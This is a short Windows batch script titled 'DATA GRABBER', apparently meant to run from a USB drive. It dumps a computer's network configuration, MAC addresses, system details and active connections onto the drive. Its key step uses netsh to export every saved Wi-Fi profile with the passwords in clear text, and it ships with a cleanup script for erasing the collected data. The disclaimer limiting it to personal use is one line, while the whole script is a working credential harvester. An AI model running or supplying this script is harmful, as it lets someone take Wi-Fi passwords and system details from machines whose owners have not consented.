::  DRIVE A - DATA GRABBER
::  run.bat 	- Grab the computers data (Network Info, Computer Info, etc.)
::  clear.bat 	- Clear stored data off of drive

::  Disclaimer
::  This drive is intended for personal usage, not to grab other people's data.

::  Creates a folder with the name of the computer
::  Also creates a folder for all Computer Info (OS, IPs, etc.)
md %computername%\ComputerInfo
::  Saves all of the current IP info onto a file
ipconfig /all > %CD%\%computername%\ComputerInfo\ipconfig.txt
::  Saves all of the current Mac address info onto a file
getmac > %CD%\%computername%\ComputerInfo\getmac.txt
::  Saves all of the system info (OS, Host, etc.) info onto a file
systeminfo > %CD%\%computername%\ComputerInfo\systeminfo.txt
::  Saves all of the power info (Power Scheme) onto a file
powercfg /list > %CD%\%computername%\ComputerInfo\powerinfo.txt
::  Saves all of the current version info onto a file
ver > %CD%\%computername%\ComputerInfo\version.txt
::  Creates a new folder for Network Info (Wifi Passwords)
md %computername%\NetworkInfo\Networks
::  Saves the network status onto a file
netstat -n > %CD%\%computername%\NetworkInfo\netstat.txt
::  Saves all of the saved wifi passwords onto files
netsh wlan export profile folder=%CD%\%computername%\NetworkInfo\Networks key=clear
::  Copies the clear.bat file for easy deletion
copy clear.bat %CD%\%computername%
